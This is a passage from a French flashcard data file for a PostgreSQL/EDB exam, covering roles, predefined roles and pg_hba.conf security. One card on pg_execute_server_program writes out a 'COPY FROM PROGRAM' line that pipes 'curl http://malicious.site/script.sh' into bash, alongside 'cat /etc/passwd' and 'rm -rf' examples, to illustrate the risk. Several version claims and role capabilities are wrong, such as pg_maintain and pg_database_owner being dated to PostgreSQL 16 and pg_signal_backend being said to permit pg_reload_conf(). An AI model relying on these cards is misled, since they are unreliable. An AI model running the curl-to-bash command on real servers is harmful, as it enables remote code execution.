      question: 'Quels privilèges absolus détient le rôle propriétaire (`OWNER`) d\'une table ou d\'un schéma, et peut-on lui retirer ces privilèges avec `REVOKE` ?',
      codeSnippet: 'ALTER TABLE factures OWNER TO facturation_admin;\nREVOKE ALL ON factures FROM facturation_admin; -- Quel résultat ?',
      hint: 'Le propriétaire détient toujours les pleins pouvoirs structurels sur ses objets, indépendamment de toute commande REVOKE.',
    },
    back: {
      answer: 'Le rôle propriétaire (`OWNER`) d\'un objet possède des prérogatives inaliénables :\n1. Droit exclusif de modifier la structure (`ALTER TABLE`), d\'ajouter des colonnes, de créer des index ou des triggers, et de détruire l\'objet (`DROP TABLE`).\n2. Droit exclusif d\'accorder (`GRANT`) ou de révoquer (`REVOKE`) des privilèges sur cet objet à d\'autres rôles.\n3. Même si vous exécutez `REVOKE ALL ON factures FROM facturation_admin;`, le propriétaire peut TOUJOURS se ré-accorder immédiatement tous les droits (`GRANT ALL ON factures TO facturation_admin;`) !\n\nPour retirer le contrôle d\'un objet à un utilisateur, la seule solution est de transférer la propriété : `ALTER TABLE factures OWNER TO nouveau_role;`.',
      explanation: 'Dans les architectures sécurisées d\'entreprise, les tables appartiennent souvent à un rôle sans droit de connexion (`app_owner`), et les applications se connectent avec un compte distinct (`app_user`) ayant uniquement `SELECT, INSERT, UPDATE, DELETE`.',
      examTrap: 'Ne jamais tenter de brider un compte sur une table dont il est lui-même l\'owner : c\'est architecturalement impossible dans le modèle relationnel PostgreSQL.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.1: Database Roles and Object Ownership',
    },
  },
  {
    id: 'fc-pgedb-dom03-019',
    cardNumber: 19,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Catalogue des adhésions : `pg_auth_members`',
    difficulty: 'hard',
    tags: ['pg_auth_members', 'Catalog', 'OID', 'Auditing'],
    front: {
      question: 'Quelle table du catalogue système conserve les liens d\'adhésion entre les rôles et comment identifier les membres d\'un groupe par requête SQL ?',
      codeSnippet: 'SELECT r.rolname AS group_name, m.rolname AS member_name, a.admin_option\nFROM pg_auth_members a\nJOIN pg_roles r ON a.roleid = r.oid\nJOIN pg_roles m ON a.member = m.oid;',
      hint: 'Elle associe l\'OID du rôle groupe à l\'OID du membre avec des flags booléens.',
    },
    back: {
      answer: 'La table système est `pg_auth_members` (stockée au niveau global dans `pg_global`).\nColonnes clés :\n- `roleid` : OID du rôle parent (le groupe auquel on appartient).\n- `member` : OID du rôle membre (l\'utilisateur ou sous-groupe rattaché).\n- `grantor` : OID du rôle qui a exécuté le `GRANT`.\n- `admin_option` : Booléen indiquant si le membre peut administrer ce groupe.\n- `inherit_option` (PG 16+) : Booléen indiquant si les privilèges sont hérités.\n- `set_option` (PG 16+) : Booléen indiquant si `SET ROLE` est permis.',
      explanation: 'Cette table permet aux outils d\'audit de cartographier l\'arbre complet des permissions et des délégations administratives.',
      examTrap: 'Ne pas chercher les adhésions dans `pg_roles` : `pg_roles` décrit chaque rôle individuellement mais ne stocke pas la matrice de relation n:n des adhésions.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 54: System Catalogs - pg_auth_members',
    },
  },
  {
    id: 'fc-pgedb-dom03-020',
    cardNumber: 20,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Rôle public universel (`PUBLIC`)',
    difficulty: 'medium',
    tags: ['PUBLIC', 'Default Security', 'Hardening', 'Zero Trust'],
    front: {
      question: 'Qu\'est-ce que le pseudo-rôle `PUBLIC` dans PostgreSQL et pourquoi est-il critique de révoquer ses droits par défaut lors du durcissement d\'une base ?',
      codeSnippet: 'REVOKE ALL ON SCHEMA public FROM PUBLIC;\nREVOKE CONNECT ON DATABASE compta_db FROM PUBLIC;',
      hint: 'Tout privilège accordé à PUBLIC s\'applique automatiquement et implicitement à absolument tous les rôles du cluster.',
    },
    back: {
      answer: '`PUBLIC` est un pseudo-rôle implicite représentant la communauté de TOUS les utilisateurs existants et futurs du cluster.\n- Tout privilège accordé à `PUBLIC` est immédiatement acquis par n\'importe quel rôle connecté.\n\nPourquoi le durcir :\n1. Historiquement, `PUBLIC` avait le droit `CREATE` sur le schéma `public` (corrigé en PG 15+ pour des raisons de sécurité).\n2. Par défaut, `PUBLIC` possède le droit `CONNECT` sur toute nouvelle base de données créée !\n3. Pour interdire à des utilisateurs arbitraires de se connecter à une base sensible, il est indispensable d\'exécuter : `REVOKE CONNECT ON DATABASE db_name FROM PUBLIC;` puis d\'accorder le droit uniquement aux rôles autorisés.',
      explanation: '`PUBLIC` n\'apparaît pas dans la vue `pg_roles` car ce n\'est pas un rôle physique stocké dans le catalogue, mais une clause spéciale du parseur SQL.',
      examTrap: 'Supprimer un utilisateur d\'un groupe ne lui retire PAS les droits que vous avez accordés à `PUBLIC`.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.1: Database Roles & Privileges (PUBLIC)',
    },
  },

  // =========================================================================
  // SECTION 3 : RÔLES PRÉDÉFINIS DU SYSTÈME POSTGRESQL (Cartes 21 à 30)
  // pg_read_all_data, pg_write_all_data, pg_read_all_settings, pg_monitor, pg_maintain (PG 16)
  // =========================================================================
  {
    id: 'fc-pgedb-dom03-021',
    cardNumber: 21,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Rôle prédéfini `pg_read_all_data`',
    difficulty: 'medium',
    tags: ['pg_read_all_data', 'Predefined Roles', 'Read-Only Admin', 'PostgreSQL 14+'],
    front: {
      question: 'Quel privilège global accorde le rôle système prédéfini `pg_read_all_data` et quel problème historique résout-il ?',
      codeSnippet: 'GRANT pg_read_all_data TO analyst_user;',
      hint: 'Il permet de lire toutes les tables, vues et séquences du cluster sans avoir besoin de droits SUPERUSER.',
    },
    back: {
      answer: 'Le rôle prédéfini `pg_read_all_data` (introduit dans PostgreSQL 14) confère le droit de lecture universel (`SELECT`) sur TOUTES les tables, vues et séquences de toutes les bases de données du cluster, y compris celles qui seront créées dans le futur.\n\nProblème historique résolu :\n- Auparavant, pour créer un compte d\'audit global, d\'extraction BI ou de sauvegarde logique (`pg_dump`), les DBA devaient soit donner les pleins pouvoirs dangereux de `SUPERUSER`, soit maintenir des scripts complexes de `GRANT SELECT` et de `DEFAULT PRIVILEGES` sur chaque schéma.',
      explanation: 'C\'est l\'un des rôles de référence recommandés par les benchmarks CIS (Center for Internet Security) pour appliquer le moindre privilège.',
      examTrap: '`pg_read_all_data` permet de lire les données applicatives mais ne contourne PAS la sécurité au niveau des lignes (RLS) à moins que le rôle n\'ait aussi `BYPASSRLS`.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.5: Predefined Roles',
    },
  },
  {
    id: 'fc-pgedb-dom03-022',
    cardNumber: 22,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Rôle prédéfini `pg_write_all_data`',
    difficulty: 'medium',
    tags: ['pg_write_all_data', 'Predefined Roles', 'DML Privileges'],
    front: {
      question: 'Quels privilèges de manipulation de données accorde le rôle système `pg_write_all_data` ?',
      codeSnippet: 'GRANT pg_write_all_data TO etl_service;',
      hint: 'Il confère les droits d\'écriture DML (INSERT, UPDATE, DELETE) sur l\'intégralité des tables du cluster.',
    },
    back: {
      answer: 'Le rôle `pg_write_all_data` accorde les privilèges d\'écriture DML universels :\n- `INSERT`\n- `UPDATE`\n- `DELETE`\nsur toutes les tables, vues modifiables et relations de toutes les bases du cluster (actuelles et futures).\n\nCas d\'usage typique : Comptes de services d\'intégration continue, outils d\'ETL ou mécanismes d\'ingestion globale de données sans accorder de privilèges de superutilisateur.',
      explanation: 'Attention : `pg_write_all_data` ne confère PAS le droit de modifier la structure des tables (`DDL`, comme `ALTER TABLE` ou `DROP TABLE`) ; il ne touche qu\'aux données.',
      examTrap: '`pg_write_all_data` n\'inclut pas implicitement le droit de lecture `SELECT`. Pour qu\'un outil d\'ETL puisse faire des `UPDATE ... WHERE`, il doit souvent combiner `pg_read_all_data` et `pg_write_all_data`.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.5: Predefined Roles',
    },
  },
  {
    id: 'fc-pgedb-dom03-023',
    cardNumber: 23,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Méta-rôle de supervision : `pg_monitor`',
    difficulty: 'easy',
    tags: ['pg_monitor', 'Prometheus', 'Datadog', 'Monitoring Agents'],
    front: {
      question: 'Quel est le rôle prédéfini recommandé pour configurer un agent de supervision externe (ex: Datadog, Prometheus, Zabbix) et que regroupe-t-il ?',
      codeSnippet: 'CREATE ROLE agent_prometheus WITH LOGIN PASSWORD \'secret\';\nGRANT pg_monitor TO agent_prometheus;',
      hint: 'C\'est un méta-rôle qui agrège plusieurs rôles de lecture de métriques et statistiques.',
    },
    back: {
      answer: 'Le rôle recommandé est `pg_monitor`.\nC\'est un rôle composite qui regroupe automatiquement les privilèges de trois sous-rôles système :\n1. `pg_read_all_settings` : Droit de lire tous les paramètres du serveur et la vue `pg_settings`.\n2. `pg_read_all_stats` : Droit de lire toutes les vues d\'activité et statistiques (`pg_stat_activity`, `pg_stat_database`, `pg_stat_replication`, `pg_stat_wal`, etc.) avec affichage en clair des requêtes des autres utilisateurs.\n3. `pg_stat_scan_tables` : Droit d\'exécuter des fonctions d\'inspection et d\'analyse de tables.\n\nIl permet à l\'agent de tout observer sans pouvoir modifier la moindre configuration ni accéder aux données confidentielles des tables.',
      explanation: 'Avant l\'introduction de `pg_monitor`, les agents de supervision tournaient souvent en `postgres` (superuser), ce qui représentait une faille de sécurité majeure.',
      examTrap: '`pg_monitor` n\'a aucun droit de lecture sur les données applicatives (`SELECT` sur les tables métiers reste interdit).',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.5: Predefined Roles',
    },
  },
  {
    id: 'fc-pgedb-dom03-024',
    cardNumber: 24,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Délégation de gestion des processus : `pg_signal_backend`',
    difficulty: 'medium',
    tags: ['pg_signal_backend', 'Kill Session', 'pg_cancel_backend', 'pg_terminate_backend'],
    front: {
      question: 'Quelles actions concrètes permet d\'exécuter le rôle prédéfini `pg_signal_backend` ?',
      codeSnippet: 'GRANT pg_signal_backend TO dba_junior;\n-- dba_junior peut exécuter :\nSELECT pg_cancel_backend(12345);\nSELECT pg_terminate_backend(12345);\nSELECT pg_reload_conf();',
      hint: 'Il permet d\'envoyer des signaux d\'annulation de requête ou d\'interruption de session à d\'autres connexions.',
    },
    back: {
      answer: 'Le rôle `pg_signal_backend` permet d\'envoyer des signaux d\'interruption à d\'autres processus serveurs (backends) :\n1. `pg_cancel_backend(pid)` : Annule la requête SQL actuellement en cours d\'exécution dans la session ciblée (envoi d\'un signal SIGINT) sans couper la connexion cliente.\n2. `pg_terminate_backend(pid)` : Déconnecte et détruit immédiatement la session cliente (envoi d\'un signal SIGTERM).\n3. `pg_reload_conf()` : Envoie un signal SIGHUP au Postmaster pour recharger la configuration.\n\nRestriction de sécurité : Un membre de `pg_signal_backend` ne peut annuler ou terminer que des sessions appartenant à des rôles NON-superutilisateurs.',
      explanation: 'Indispensable pour permettre à une équipe de support opérationnel (NOC / DBA Junior) d\'intervenir sur des blocages sans leur accorder `SUPERUSER`.',
      examTrap: 'Un membre de `pg_signal_backend` recevra une erreur s\'il tente d\'exécuter `pg_terminate_backend()` contre le PID d\'une session ouverte par `postgres` (superuser).',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.5: Predefined Roles',
    },
  },
  {
    id: 'fc-pgedb-dom03-025',
    cardNumber: 25,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Nouveauté PostgreSQL 16 : Rôle de maintenance `pg_maintain`',
    difficulty: 'hard',
    tags: ['pg_maintain', 'PostgreSQL 16', 'VACUUM', 'ANALYZE', 'REINDEX'],
    front: {
      question: 'Quelles opérations majeures d\'administration de base de données le nouveau rôle `pg_maintain` (introduit dans PostgreSQL 16) permet-il d\'exécuter ?',
      codeSnippet: 'GRANT pg_maintain TO maintenance_robot;',
      hint: 'Il autorise l\'exécution des commandes VACUUM, ANALYZE, REINDEX, CLUSTER sur toutes les tables sans être superutilisateur.',
    },
    back: {
      answer: 'Introduit dans PostgreSQL 16, le rôle prédéfini `pg_maintain` autorise l\'exécution des commandes de maintenance courantes sur l\'ensemble des relations de la base :\n- `VACUUM` (standard) et `VACUUM FULL`\n- `ANALYZE`\n- `REINDEX` (et `REINDEX CONCURRENTLY`)\n- `REFRESH MATERIALIZED VIEW`\n- `CLUSTER`\n- `LOCK TABLE`\nsur toutes les tables de la base de données, même si le rôle n\'en est pas le propriétaire (`owner`) et sans avoir besoin des privilèges `SUPERUSER`.',
      explanation: 'Auparavant, pour lancer un script de réindexation nocturne ou un VACUUM périodique, il fallait impérativement tourner en `SUPERUSER` ou être le propriétaire de chaque table.',
      examTrap: 'C\'est une des questions d\'actualité favorites de l\'examen PostgreSQL 16 / EDB Associate.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.5: Predefined Roles (pg_maintain)',
    },
  },
  {
    id: 'fc-pgedb-dom03-026',
    cardNumber: 26,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Rôle `pg_checkpoint` (introduit en PG 15)',
    difficulty: 'medium',
    tags: ['pg_checkpoint', 'PostgreSQL 15+', 'Disaster Recovery', 'Maintenance'],
    front: {
      question: 'Quel est l\'unique privilège accordé par le rôle système `pg_checkpoint` ?',
      codeSnippet: 'GRANT pg_checkpoint TO backup_service;',
      hint: 'Il permet de déclencher l\'écriture immédiate de tous les buffers sales sur le disque via une commande SQL.',
    },
    back: {
      answer: 'Le rôle système `pg_checkpoint` (apparu en PostgreSQL 15) accorde l\'autorisation exclusive d\'exécuter la commande SQL :\n```sql\nCHECKPOINT;\n```\nIl permet d\'ordonner au processus Checkpointer de vider immédiatement tous les dirty buffers en mémoire vers le stockage physique et de consigner un point de contrôle dans le WAL.\n\nCas d\'usage : Outils de sauvegarde à chaud externes, scripts de maintenance pré-arrêt ou bascules de cluster qui exigent de forcer un checkpoint sans exiger les droits de `SUPERUSER`.',
      explanation: 'Auparavant, seul un superutilisateur pouvait lancer la commande SQL `CHECKPOINT`.',
      examTrap: 'Si un rôle standard sans `pg_checkpoint` tente de lancer `CHECKPOINT;`, PostgreSQL répond "ERROR: must be superuser or member of pg_checkpoint to do a checkpoint".',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.5: Predefined Roles',
    },
  },
  {
    id: 'fc-pgedb-dom03-027',
    cardNumber: 27,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Rôles à très haut risque système : `pg_execute_server_program`',
    difficulty: 'hard',
    tags: ['pg_execute_server_program', 'Security Risk', 'OS Command Execution', 'COPY PROGRAM'],
    front: {
      question: 'Pourquoi le rôle `pg_execute_server_program` est-il considéré comme aussi dangereux et critique que le statut de `SUPERUSER` ?',
      codeSnippet: 'COPY audit_log FROM PROGRAM \'cat /etc/passwd\';\nCOPY temp_table TO PROGRAM \'rm -rf /tmp/data\';',
      hint: 'Il permet d\'exécuter n\'importe quel binaire ou script shell sur le système d\'exploitation hôte sous le compte postgres.',
    },
    back: {
      answer: 'Le rôle prédéfini `pg_execute_server_program` autorise l\'utilisation de la directive `PROGRAM` dans les commandes `COPY` :\n```sql\nCOPY matable FROM PROGRAM \'curl http://malicious.site/script.sh | bash\';\n```\nConséquence de sécurité :\n- Tout rôle membre de `pg_execute_server_program` peut exécuter n\'importe quelle commande du système d\'exploitation Linux hôte avec les droits du compte OS `postgres` !\n- Il peut lire des fichiers confidentiels, modifier le code source ou déclencher un shell interactif.\n\nIl équivaut virtuellement à accorder un accès root/OS complet au serveur.',
      explanation: 'Ne JAMAIS attribuer ce rôle à des utilisateurs non approuvés ou à des applications connectées à Internet.',
      examTrap: 'Accorder `pg_execute_server_program` à un rôle permet une élévation de privilège immédiate vers `SUPERUSER` via l\'OS.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.5: Predefined Roles',
    },
  },
  {
    id: 'fc-pgedb-dom03-028',
    cardNumber: 28,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Rôles de manipulation de fichiers hôtes : `pg_read_server_files` & `pg_write_server_files`',
    difficulty: 'hard',
    tags: ['pg_read_server_files', 'pg_write_server_files', 'Filesystem Security', 'COPY'],
    front: {
      question: 'À quoi servent les rôles `pg_read_server_files` et `pg_write_server_files` et quelles commandes SQL débloquent-ils ?',
      codeSnippet: 'COPY clients FROM \'/var/data/clients.csv\';\nCOPY clients TO \'/var/data/export.csv\';\nSELECT pg_read_file(\'postgresql.conf\');',
      hint: 'Ils permettent d\'importer ou exporter des fichiers situés directement sur le système de fichiers du serveur.',
    },
    back: {
      answer: '1. `pg_read_server_files` :\n- Autorise l\'utilisation de `COPY ... FROM \'/chemin/fichier\';` côté serveur.\n- Autorise l\'appel des fonctions de lecture de fichiers internes : `pg_read_file()`, `pg_read_binary_file()`, `pg_stat_file()`.\n\n2. `pg_write_server_files` :\n- Autorise l\'utilisation de `COPY ... TO \'/chemin/fichier\';` côté serveur.\n- Autorise l\'écriture de fichiers sur le disque via les fonctions système.\n\nCes privilèges évitent de devoir conférer le rôle `SUPERUSER` à des comptes de chargement de données par fichiers plats.',
      explanation: 'Attention : Ces opérations s\'exécutent sur le système de fichiers du SERVEUR distant, contrairement à la méta-commande `\copy` de psql qui opère sur la machine CLIENTE.',
      examTrap: 'Ces rôles ne permettent d\'accéder qu\'aux fichiers pour lesquels l\'utilisateur OS `postgres` dispose des permissions de lecture/écriture sur le disque Linux.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.5: Predefined Roles',
    },
  },
  {
    id: 'fc-pgedb-dom03-029',
    cardNumber: 29,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Rôle prédéfini `pg_database_owner` (PostgreSQL 16+)',
    difficulty: 'medium',
    tags: ['pg_database_owner', 'PostgreSQL 16', 'Ownership', 'Implicit Roles'],
    front: {
      question: 'Qu\'est-ce que le rôle implicite spécial `pg_database_owner` apparu dans PostgreSQL 16 et comment est-il utilisé dans les schémas ?',
      codeSnippet: 'GRANT ALL ON SCHEMA app_schema TO pg_database_owner;',
      hint: 'C\'est un rôle abstrait qui représente dynamiquement le propriétaire actuel de la base de données courante.',
    },
    back: {
      answer: 'Le rôle prédéfini `pg_database_owner` est un pseudo-rôle dynamique introduit dans PostgreSQL 16 :\n- Il représente automatiquement et implicitement le rôle qui est le propriétaire actuel de la base de données dans laquelle on se trouve (`pg_database.datdba`).\n- Si vous transférez la propriété de la base à un autre utilisateur via `ALTER DATABASE db_name OWNER TO new_owner;`, l\'appartenance à `pg_database_owner` bascule immédiatement sur ce nouveau propriétaire sans avoir à modifier les permissions des schémas !\n- Idéal pour créer des templates de bases sécurisés où le propriétaire de la base dispose automatiquement de privilèges prédéfinis.',
      explanation: 'Il simplifie considérablement la maintenance des environnements multi-tenants où chaque client possède sa propre base.',
      examTrap: 'Vous ne pouvez pas accorder `pg_database_owner` manuellement à un utilisateur avec `GRANT` : c\'est le moteur qui l\'associe dynamiquement au propriétaire réel.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.5: Predefined Roles (pg_database_owner)',
    },
  },
  {
    id: 'fc-pgedb-dom03-030',
    cardNumber: 30,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Liste exhaustive des rôles prédéfinis du système',
    difficulty: 'easy',
    tags: ['Catalog Query', 'pg_roles', 'Predefined Roles', 'Audit'],
    front: {
      question: 'Comment lister par requête SQL l\'ensemble des rôles prédéfinis fournis nativement par le moteur PostgreSQL ?',
      codeSnippet: 'SELECT rolname, rolinherit, rolcanlogin\nFROM pg_roles\nWHERE rolname LIKE \'pg_%\'\nORDER BY rolname;',
      hint: 'Tous les rôles et tables réservés au système interne commencent systématiquement par le préfixe pg_.',
    },
    back: {
      answer: 'Tous les rôles prédéfinis du système PostgreSQL partagent la convention stricte de commencer par le préfixe réservé `pg_` :\n- Exemples majeurs : `pg_read_all_data`, `pg_write_all_data`, `pg_read_all_settings`, `pg_read_all_stats`, `pg_monitor`, `pg_signal_backend`, `pg_checkpoint`, `pg_maintain`, `pg_execute_server_program`, `pg_read_server_files`, `pg_write_server_files`, `pg_database_owner`.\n\nIl est formellement interdit à un utilisateur de créer un rôle personnalisé débutant par `pg_` (le serveur rejettera la commande avec une erreur de syntaxe réservée).',
      explanation: 'Ces rôles ne peuvent pas non plus être supprimés (`DROP ROLE pg_monitor` déclenche une erreur).',
      examTrap: 'La commande `CREATE ROLE pg_auditeur;` échouera systématiquement avec "ERROR: role name pg_auditeur is reserved".',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 22.5: Predefined Roles',
    },
  },

  // =========================================================================
  // SECTION 4 : ANATOMIE & SYNTAXE DU FICHIER `pg_hba.conf` (Cartes 31 à 40)
  // Host-Based Authentication, colonnes, types, adresses, first-match, pg_hba_file_rules
  // =========================================================================
  {
    id: 'fc-pgedb-dom03-031',
    cardNumber: 31,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Rôle fondamental du fichier `pg_hba.conf`',
    difficulty: 'easy',
    tags: ['pg_hba.conf', 'Authentication', 'Security Gateway', 'Architecture'],
    front: {
      question: 'Quel est le rôle du fichier de configuration `pg_hba.conf` et que signifie son acronyme "HBA" ?',
      hint: 'Host-Based Authentication : il contrôle qui a le droit de se connecter au serveur et par quelle méthode.',
    },
    back: {
      answer: '`pg_hba.conf` signifie **Host-Based Authentication** (Authentification basée sur l\'hôte).\n\nRôle vital :\n- C\'est le pare-feu applicatif d\'authentification de PostgreSQL.\n- Dès qu\'un client tente d\'initier une connexion (locale ou réseau), le serveur inspecte ce fichier pour déterminer :\n  1. Si la machine cliente, la base ciblée et l\'utilisateur sont autorisés à dialoguer avec le serveur.\n  2. Quelle méthode d\'authentification doit être exigée (`scram-sha-256`, `cert`, `peer`, etc.) pour prouver son identité.\n\nSi aucune ligne de `pg_hba.conf` ne correspond à la tentative de connexion, celle-ci est instantanément et silencieusement rejetée.',
      explanation: 'Situé par défaut à la racine de `$PGDATA`, son chemin peut être déporté via le paramètre `hba_file` de `postgresql.conf`.',
      examTrap: 'Même si un rôle existe avec un mot de passe valide dans la base, il ne pourra JAMAIS se connecter si `pg_hba.conf` ne comporte pas de ligne concordante l\'autorisant.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.1: The pg_hba.conf File',
    },
  },
  {
    id: 'fc-pgedb-dom03-032',
    cardNumber: 32,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Structure et colonnes d\'une directive dans `pg_hba.conf`',
    difficulty: 'easy',
    tags: ['pg_hba.conf', 'Syntax', 'Columns', 'Configuration'],
    front: {
      question: 'Quelles sont les colonnes obligatoires constituant chaque ligne d\'enregistrement dans le fichier `pg_hba.conf` ?',
      codeSnippet: '# TYPE  DATABASE        USER            ADDRESS                 METHOD  [OPTIONS]\nhost    compta_db       compta_user     192.168.1.50/32         scram-sha-256',
      hint: 'Une directive réseau comporte 5 colonnes de base (TYPE, DATABASE, USER, ADDRESS, METHOD).',
    },
    back: {
      answer: 'Les colonnes d\'une directive dans `pg_hba.conf` sont :\n1. `TYPE` : Le médium de communication (`local`, `host`, `hostssl`, `hostnossl`).\n2. `DATABASE` : La base ou les bases ciblées (`all`, `sameuser`, `replication`, nom_base).\n3. `USER` : Le ou les utilisateurs concernés (`all`, `+nom_groupe`, nom_user).\n4. `ADDRESS` : L\'adresse réseau IP/CIDR (présente uniquement pour les types `host*`).\n5. `METHOD` : L\'algorithme d\'authentification exigé (`scram-sha-256`, `trust`, `reject`, `peer`, etc.).\n6. `[OPTIONS]` : Arguments optionnels propres à la méthode (ex: `clientcert=verify-full`, `map=adminmap`).',
      explanation: 'Pour le type `local`, la colonne `ADDRESS` est omise, la ligne ne comptant alors que 4 colonnes principales.',
      examTrap: 'Inverser l\'ordre des colonnes (ex: placer l\'utilisateur avant la base) rend le fichier invalide et empêchera la prise en compte de la règle lors du rechargement.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.1: The pg_hba.conf File',
    },
  },
  {
    id: 'fc-pgedb-dom03-033',
    cardNumber: 33,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Types de connexions : `local`, `host`, `hostssl`, `hostnossl`',
    difficulty: 'medium',
    tags: ['local', 'host', 'hostssl', 'hostnossl', 'Networking', 'SSL/TLS'],
    front: {
      question: 'Quelle est la différence fondamentale entre les quatre valeurs possibles de la colonne `TYPE` dans `pg_hba.conf` ?',
      codeSnippet: 'local      all   all                  peer\nhost       all   all   10.0.0.0/8     scram-sha-256\nhostssl    all   all   0.0.0.0/0      scram-sha-256\nhostnossl  all   all   0.0.0.0/0      reject',
      hint: 'L\'un utilise les sockets Unix locaux, les trois autres concernent TCP/IP avec différentes exigences de chiffrement TLS.',
    },
    back: {
      answer: '1. `local` : Connexions établies via les sockets de domaine Unix locaux sur le système de fichiers (ex: `/tmp/.s.PGSQL.5432`). Pas de pile TCP/IP.\n2. `host` : Connexions TCP/IP distantes ou locales (127.0.0.1). Correspond aux connexions chiffrées SSL OU non-chiffrées en clair.\n3. `hostssl` : Connexions TCP/IP exigeant IMPÉRATIVEMENT le chiffrement SSL/TLS. Toute tentative non chiffrée est rejetée dès la négociation initiale.\n4. `hostnossl` : Connexions TCP/IP interdisant formellement SSL/TLS (n\'accepte que les flux en clair). Rarement utilisé, sauf pour du trafic sur réseau isolé ou rejet explicite.',
      explanation: 'Pour forcer le chiffrement de toutes les connexions distantes, on utilise exclusivement des lignes `hostssl`.',
      examTrap: 'La directive `local` ne fonctionne pas sur les systèmes d\'exploitation Windows (qui n\'implémentent pas les sockets de domaine Unix standard) ; sur Windows, même `localhost` passe par `host` TCP/IP.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.1: The pg_hba.conf File',
    },
  },
  {
    id: 'fc-pgedb-dom03-034',
    cardNumber: 34,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Règle de préséance séquentielle : "First-Match Wins"',
    difficulty: 'medium',
    tags: ['Precedence', 'First Match', 'Order of Evaluation', 'Exam Trap'],
    front: {
      question: 'Comment PostgreSQL évalue-t-il les lignes de `pg_hba.conf` lorsqu\'un client se connecte, et quelle est la règle d\'or d\'ordonnancement ?',
      codeSnippet: '# Ligne 1:\nhost    all    all         0.0.0.0/0    reject\n# Ligne 2:\nhost    all    admin_user  0.0.0.0/0    scram-sha-256',
      hint: 'PostgreSQL s\'arrête à la TOUTE PREMIÈRE ligne qui concorde avec la connexion cliente et ignore le reste.',
    },
    back: {
      answer: 'PostgreSQL évalue le fichier `pg_hba.conf` de manière séquentielle, de haut en bas, selon le principe du **"First-Match Wins"** (Le premier motif concordant l\'emporte) :\n\n1. Dès qu\'une ligne correspond au type, à la base, à l\'utilisateur et à l\'adresse IP de la connexion entrante, PostgreSQL choisit cette règle et CESSE immédiatement d\'analyser les lignes suivantes.\n2. Dans l\'exemple ci-contre, `admin_user` sera systématiquement REJETÉ par la Ligne 1, car la Ligne 1 concorde avec `all` et est placée avant la Ligne 2.\n\nRègle d\'or d\'administration :\nToujours placer les règles spécifiques et restrictives (comptes nominatifs, sous-réseaux restreints, certificats) EN HAUT du fichier, et les règles génériques (`all`, `0.0.0.0/0`) TOUT EN BAS.',
      explanation: 'Si aucune ligne ne concorde jusqu\'à la fin du fichier, l\'accès est automatiquement refusé ("no pg_hba.conf entry for host...").',
      examTrap: 'C\'est le piège numéro 1 sur les examens : une ligne `host all all 0.0.0.0/0 reject` placée en haut neutralise l\'ensemble du fichier situé en dessous !',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.1: The pg_hba.conf File',
    },
  },
  {
    id: 'fc-pgedb-dom03-035',
    cardNumber: 35,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Spécificateurs spéciaux de base de données (`all`, `sameuser`, `replication`)',
    difficulty: 'medium',
    tags: ['sameuser', 'replication', 'DATABASE Column', 'Special Keywords'],
    front: {
